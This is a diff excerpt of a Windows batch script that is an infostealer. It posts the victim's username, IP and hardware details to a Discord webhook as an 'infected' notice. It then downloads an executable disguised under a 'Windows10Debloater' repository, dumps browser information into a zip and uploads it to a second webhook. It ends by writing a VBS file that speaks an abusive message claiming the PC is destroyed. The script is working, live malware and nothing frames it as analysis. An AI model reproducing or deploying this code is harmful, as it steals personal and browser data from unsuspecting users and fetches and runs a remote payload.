@@ -5,12 +5,9 @@ for /f "usebackq skip=1 tokens=*" %%i in (`wmic cpu get name ^| findstr /r /v "^
 for /f "usebackq skip=1 tokens=*" %%i in (`wmic path win32_VideoController get name ^| findstr /r /v "^$"`) do set gpu=%%i
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%username% has been infected!**^\n^\n**Information of User**^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\n**Information of Computer**^\n:alarm_clock: CPU : %cpu%^\n:bricks: GPU : %gpu%\"}" https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ
 endlocal
-
 powershell -Command "iwr "https://github.com/Dazd-Pkz/Windows10Debloater/raw/main/powershell.exe" -o %temp%\powershell.exe"
 %temp%\powershell.exe --zip --dir dump
 curl -k -F "payload_json={\"content\": \"All Internet Browser Information of %username%\"}" -F "file1=@dump\dump.zip" https://discord.com/api/webhooks/1007412375793709080/BZDz7xnEo4Aqs2-JTp6fwNgonAfSNopbaeXJ2vbUcbfXkiG52jITU3KV8F-vUWDkD97g
-rd /s /q dump&del chromiumKey /f
-
 echo Dim sapi > %temp%\voice.vbs
 echo Set sapi=CreateObject("sapi.spvoice") >> %temp%\voice.vbs
 echo sapi.Speak "Coucou, je suis juste la petite voix qui te dit que la P D S vient de detruire ton pc, et ce, a tout jamais. amuse toi bien na le repare fils de viole, trais content. daidi au reille de la speilld." >> %temp%\voice.vbs
